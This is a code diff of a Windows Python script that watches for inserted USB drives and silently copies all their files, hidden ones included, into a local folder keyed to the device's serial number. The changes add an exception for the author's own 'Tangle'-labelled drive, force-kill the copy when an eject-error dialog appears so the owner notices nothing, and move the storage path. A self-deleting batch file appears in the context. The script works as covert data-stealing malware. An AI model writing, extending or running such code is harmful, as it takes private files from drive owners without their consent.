@@ -54,6 +54,8 @@ class App:
         self.serial_number = args[3]
         self.vid_hex = args[4]
         self.disk_name = win32api.GetVolumeInformation(f'{self.drive}\\')[0] # 卷标
+        if "Tangle" in self.disk_name:
+            exit()
         t = threading.Thread(target=self.exit_disk)
         t.start()
     
@@ -61,7 +63,9 @@ class App:
         _time = time.time() + 36000 # 10 小时
         while True:
             var = win32gui.FindWindow('#32770', '弹出 USB 大容量存储设备 时出问题')
-            if var:
+            var1 = win32gui.FindWindow("#32770", "Microsoft Windows")
+            if var or var1:
+                print(123)
                 subprocess.call("taskkill /f /im xcopy.exe", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 break
             elif time.time() > _time:
@@ -86,10 +90,9 @@ del %0
         subprocess.call("temp.bat", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
     def xcopy(self):
-        local_path = f'D:\\drive\\{self.vid_hex}{self.serial_number}\\'
+        local_path = f'D:\\MTO\\MTO\\大全\\device\\{self.vid_hex}{self.serial_number}\\'
         cmd = f'xcopy {self.drive} {local_path} /e /h /d /y'
         subprocess.call(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
 App()
 ```
 
